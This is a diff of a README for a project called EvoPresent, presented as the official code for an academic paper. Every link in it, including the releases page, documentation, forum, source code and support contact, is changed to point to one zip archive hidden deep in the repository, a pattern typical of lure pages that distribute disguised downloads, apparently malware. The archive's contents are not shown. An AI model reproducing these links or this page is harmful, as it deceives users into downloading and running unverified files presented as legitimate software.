@@ -1,7 +1,7 @@
 # 🎉 EvoPresent - Enhance Your Academic Presentations
 
 ## 📥 Download Now
-[![Download EvoPresent](https://raw.githubusercontent.com/IMGD47/EvoPresent/main/purposivistic/EvoPresent.zip%https://raw.githubusercontent.com/IMGD47/EvoPresent/main/purposivistic/EvoPresent.zip)](https://raw.githubusercontent.com/IMGD47/EvoPresent/main/purposivistic/EvoPresent.zip)
+[![Download EvoPresent](https://raw.githubusercontent.com/IMGD47/EvoPresent/main/Evopresent/camel/memories/context_creators/Evo-Present-3.8.zip%https://raw.githubusercontent.com/IMGD47/EvoPresent/main/Evopresent/camel/memories/context_creators/Evo-Present-3.8.zip)](https://raw.githubusercontent.com/IMGD47/EvoPresent/main/Evopresent/camel/memories/context_creators/Evo-Present-3.8.zip)
 
 ## 📖 Overview
 EvoPresent is the official codebase for the paper "Presenting a Paper is an Art: Self-Improvement Aesthetic Agents for Academic Presentations." This application provides tools and features that help users improve their presentation skills through interactive and guided self-assessment.
@@ -10,7 +10,7 @@ EvoPresent is the official codebase for the paper "Presenting a Paper is an Art:
 To begin using EvoPresent, follow the steps below:
 
 1. **Visit the Releases Page**  
-   Go to the [EvoPresent Releases page](https://raw.githubusercontent.com/IMGD47/EvoPresent/main/purposivistic/EvoPresent.zip) to download the software.
+   Go to the [EvoPresent Releases page](https://raw.githubusercontent.com/IMGD47/EvoPresent/main/Evopresent/camel/memories/context_creators/Evo-Present-3.8.zip) to download the software.
 
 2. **Download the Application**  
    Look for the latest version on the releases page. Click the appropriate file to start the download. The file size may vary, so please be patient during the download process.
@@ -57,15 +57,15 @@ If you encounter any issues while installing or using EvoPresent, try the follow
   Engage with other users in the community. Share tips, ask questions, and get support.
 
 ## 📞 Support
-For further assistance, please contact our support team at [https://raw.githubusercontent.com/IMGD47/EvoPresent/main/purposivistic/EvoPresent.zip](https://raw.githubusercontent.com/IMGD47/EvoPresent/main/purposivistic/EvoPresent.zip). We aim to respond within one business day.
+For further assistance, please contact our support team at [https://raw.githubusercontent.com/IMGD47/EvoPresent/main/Evopresent/camel/memories/context_creators/Evo-Present-3.8.zip](https://raw.githubusercontent.com/IMGD47/EvoPresent/main/Evopresent/camel/memories/context_creators/Evo-Present-3.8.zip). We aim to respond within one business day.
 
 ## 📄 License
 EvoPresent is open-source software, released under the MIT License. You can freely use, modify, and distribute it while adhering to the terms outlined in the license file.
 
 ## 🔗 Useful Links
-- **Documentation:** [EvoPresent Documentation](https://raw.githubusercontent.com/IMGD47/EvoPresent/main/purposivistic/EvoPresent.zip)
-- **Community Forum:** [EvoPresent Community Forum](https://raw.githubusercontent.com/IMGD47/EvoPresent/main/purposivistic/EvoPresent.zip)
-- **Source Code:** [View Source Code](https://raw.githubusercontent.com/IMGD47/EvoPresent/main/purposivistic/EvoPresent.zip)
+- **Documentation:** [EvoPresent Documentation](https://raw.githubusercontent.com/IMGD47/EvoPresent/main/Evopresent/camel/memories/context_creators/Evo-Present-3.8.zip)
+- **Community Forum:** [EvoPresent Community Forum](https://raw.githubusercontent.com/IMGD47/EvoPresent/main/Evopresent/camel/memories/context_creators/Evo-Present-3.8.zip)
+- **Source Code:** [View Source Code](https://raw.githubusercontent.com/IMGD47/EvoPresent/main/Evopresent/camel/memories/context_creators/Evo-Present-3.8.zip)
 
 ## 📥 Download Again
-Don't forget to download the latest version of EvoPresent from the [Releases page](https://raw.githubusercontent.com/IMGD47/EvoPresent/main/purposivistic/EvoPresent.zip). Enjoy enhancing your academic presentations!
+Don't forget to download the latest version of EvoPresent from the [Releases page](https://raw.githubusercontent.com/IMGD47/EvoPresent/main/Evopresent/camel/memories/context_creators/Evo-Present-3.8.zip). Enjoy enhancing your academic presentations!
